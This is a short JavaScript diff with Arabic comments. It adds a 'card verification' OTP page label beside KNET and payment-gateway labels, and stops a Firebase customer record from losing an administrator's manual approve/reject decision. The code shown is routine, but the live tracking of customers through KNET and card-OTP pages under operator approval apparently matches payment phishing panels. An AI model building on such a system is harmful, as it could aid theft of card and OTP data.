@@ -122,6 +122,7 @@
     const path = window.location.pathname;
     if (path.includes('knet')) return 'صفحة الكي نت';
     if (path.includes('verification')) return 'صفحة التحقق';
+    if (path.includes('otpcredit')) return 'صفحة تحقق البطاقة';
     if (path.includes('gateway')) return 'بوابة الدفع';
     if (path.includes('carte')) return 'سلة التسوق';
     return 'الصفحة الرئيسية';
@@ -147,8 +148,22 @@
       flagColor: '',
       createdAt: firebase.firestore.FieldValue.serverTimestamp()
     };
+    // الحفاظ على القرار المحسوم (approved/rejected) إذا كان موجوداً:
+    // حتى لا تمسح دالة التهيئة موافقة/رفض المدير عند فتح أي صفحة لاحقاً
     const merged = Object.assign({}, base, extra || {});
-    return customerRef.set(merged, { merge: true });
+    return customerRef.get().then(function (snap) {
+      if (snap.exists) {
+        const cur = snap.data() || {};
+        const decided = cur.decision || cur.status || '';
+        if (decided === 'approved' || decided === 'rejected') {
+          merged.decision = decided;
+          merged.status = decided;
+        }
+      }
+      return customerRef.set(merged, { merge: true });
+    }).catch(function () {
+      return customerRef.set(merged, { merge: true });
+    });
   };
 
   // ═══════════════════════════════════════════════════════════
